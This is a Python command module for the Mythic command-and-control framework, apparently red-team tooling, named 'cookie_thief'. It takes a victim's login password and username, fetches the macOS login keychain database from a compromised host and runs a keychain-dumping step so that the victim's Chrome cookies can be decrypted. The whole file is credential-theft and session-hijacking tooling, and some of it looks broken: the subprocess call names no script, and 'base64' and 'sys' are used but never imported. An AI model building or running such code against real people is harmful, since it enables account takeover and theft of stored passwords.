from mythic_payloadtype_container.MythicCommandBase import *
import json
import os
from mythic_payloadtype_container.MythicRPC import *
import traceback
import subprocess

class CookieThiefArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "password": CommandParameter(
                name="User Login Password",
                type=ParameterType.String,
                description="p@55w0rd_here for user login",
                required=True,
                ui_position=1
            ),
            "browser": CommandParameter(
                name="Browser",
                type=ParameterType.ChooseOne,
                choices=["chrome"],
                required=False,
                description="choose the browser to steal cookies from",
                default_value="chrome",
                ui_position=2
            ),
            "username": CommandParameter(
                name="Username",
                type=ParameterType.String,
                description="Victim's username from whom to steal the cookies",
                required=True,
                ui_position=3
            ),
        }

    async def parse_arguments(self):
        temp_dict = json.loads(self.command_line)
        for k, v in temp_dict.items():
            for k2, v2 in self.args.items():
                if v2.name == k or k2 ==k:
                    v2.value = v
        # self.load_args_from_json_string(self.command_line)


class CookieThiefCommand(CommandBase):
    cmd = "cookie_thief"
    needs_admin = True
    help_cmd = "cookie_thief {user account password} {browser} {username}"
    description = "Downloads the keychain db and browser cookies, decrypts the keychain, extracts the cookie key and decrypts the cookies."
    version = 1
    #supported_ui_features = ["file_browser:download"] #CHANGE
    author = "@antman"
    parameters = []
    attackmapping = ["T1539", "T1555"]
    argument_class = CookieThiefArguments
    browser_script = BrowserScript(script_name="cookie_thief", author="@antman1p")

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.completed_callback_function = self.downloads_complete
        return task

    async def process_response(self, response: AgentResponse):
        pass

    async def downloads_complete(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
        password = task.args.get_arg("password")
        getkeychainDBResp = await MythicRPC().execute("get_file", task_id=task.id,filename="login.keychain-db", limit_by_callback=True, max_results=1, get_contents=True)
        if getkeychainDBResp.status == "success":
            getkeychainDBResp = getkeychainDBResp.response[0]
        else:
            print("Encountered an error attempting to get downloaded file: " + getkeychainDBResp.error)
            sys.stdout.flush()

        try:
            f = open("tmp_login.keychain-db", "wb")
            f.write(base64.b64decode(getkeychainDBResp["contents"]))
            f.close()
        except Exception as e:
            print("Encountered an error attempting to write the keychainDB to a file: " + str(e))
            sys.stdout.flush()


        try:
            subprocess.run(["python2", "--password=" + password, "--dump-generic-passwords", "tmp_login.keychain-db"])

        except Exception as e:
            #print("Chainbreaker script failed with error: " + str(e))
            traceback.print_exc()
            sys.stdout.flush()
            sys.exit(1)


        try:
            if os.path.isfile('/Mythic/mythic/tmp_login.keychain-db'):
                os.remove('/Mythic/mythic/tmp_login.keychain-db')
            else:
                print("Temp KeychainDB file does not exist.")
                sys.stdout.flush()
        except Exception as e:
            print("Encountered an error attempting to removing the temporary keychainDB file: " + str(e))
            sys.stdout.flush()

        return task
